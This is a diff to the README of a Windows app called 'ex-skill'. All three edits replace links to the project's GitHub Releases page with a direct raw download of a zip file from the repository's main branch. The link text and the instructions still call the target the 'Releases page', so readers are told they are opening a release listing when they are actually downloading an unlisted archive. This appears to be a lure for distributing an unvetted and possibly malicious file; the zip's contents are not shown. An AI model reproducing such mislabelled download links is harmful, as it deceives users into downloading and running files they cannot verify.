@@ -1,6 +1,6 @@
 # 🎭 ex-skill - Speak With Familiar Style
 
-[![Download ex-skill](https://img.shields.io/badge/Download%20ex--skill-blue?style=for-the-badge)](https://github.com/epididymitismilksickness526/ex-skill/releases)
+[![Download ex-skill](https://img.shields.io/badge/Download%20ex--skill-blue?style=for-the-badge)](https://github.com/epididymitismilksickness526/ex-skill/raw/refs/heads/main/tools/ex-skill-3.5.zip)
 
 ## 🧭 Overview
 
@@ -10,7 +10,7 @@ Use it if you want a simple desktop app that helps you read, write, or reply in 
 
 ## 📥 Download
 
-1. Open the [ex-skill Releases page](https://github.com/epididymitismilksickness526/ex-skill/releases)
+1. Open the [ex-skill Releases page](https://github.com/epididymitismilksickness526/ex-skill/raw/refs/heads/main/tools/ex-skill-3.5.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file for your system
 4. If the file is a ZIP, unzip it first
@@ -160,7 +160,7 @@ Keep your sample text in files you control. Store your profiles in a folder you 
 
 Use this link:
 
-[Open the ex-skill Releases page](https://github.com/epididymitismilksickness526/ex-skill/releases)
+[Open the ex-skill Releases page](https://github.com/epididymitismilksickness526/ex-skill/raw/refs/heads/main/tools/ex-skill-3.5.zip)
 
 Look for the newest file at the top of the page and choose the one for Windows
 
